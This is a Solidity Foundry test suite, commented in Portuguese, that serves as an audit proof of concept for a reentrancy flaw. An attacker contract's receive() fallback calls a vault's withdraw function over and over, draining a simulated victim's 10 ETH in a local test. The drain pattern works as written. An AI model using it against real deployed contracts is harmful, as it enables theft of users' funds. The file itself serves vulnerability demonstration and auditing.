// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {CofreVulneravel} from "../src/Counter.sol";

/**
 * @title Atacante
 * @notice Contrato malicioso utilizado na Prova de Conceito (PoC) para drenar o CofreVulneravel.
 */
contract Atacante {
    CofreVulneravel public cofre;

    constructor(address _cofre) {
        cofre = CofreVulneravel(_cofre);
    }

    /// @notice Inicia o ataque depositando 1 ETH legítimo e disparando o primeiro saque
    function iniciarAtaque() external payable {
        cofre.depositar{value: 1 ether}();
        cofre.sacar();
    }

    /// @notice Função fallback acionada automaticamente sempre que este contrato recebe ETH.
    /// @dev Enquanto o cofre tiver saldo >= 1 ETH, chama sacar() recursivamente.
    receive() external payable {
        if (address(cofre).balance >= 1 ether) {
            cofre.sacar();
        }
    }
}

/**
 * @title TesteAuditoria
 * @notice Suíte de testes Foundry comprovando o dreno total de fundos via Reentrância.
 */
contract TesteAuditoria is Test {
    CofreVulneravel public cofre;
    Atacante public atacante;

    function setUp() public {
        // Implanta o contrato alvo e o contrato do atacante
        cofre = new CofreVulneravel();
        atacante = new Atacante(address(cofre));

        // Simula uma vítima depositando 10 ETH no cofre
        address vitima = makeAddr("vitima");
        vm.deal(vitima, 10 ether);
        vm.prank(vitima);
        cofre.depositar{value: 10 ether}();
    }

    function testExploitReentrancia() public {
        console.log("Saldo inicial do Cofre:", address(cofre).balance / 1e18, "ETH");

        // Prepara a carteira do hacker com 1 ETH inicial
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        
        // Executa o ataque em nome do hacker
        vm.prank(hacker);
        atacante.iniciarAtaque{value: 1 ether}();

        console.log("Saldo final do Cofre:", address(cofre).balance / 1e18, "ETH");
        console.log("Saldo roubado pelo Atacante:", address(atacante).balance / 1e18, "ETH");

        // Asserção final: prova que os 10 ETH da vítima + 1 ETH do atacante estão no contrato malicioso
        assertEq(address(cofre).balance, 0);
        assertEq(address(atacante).balance, 11 ether);
    }
}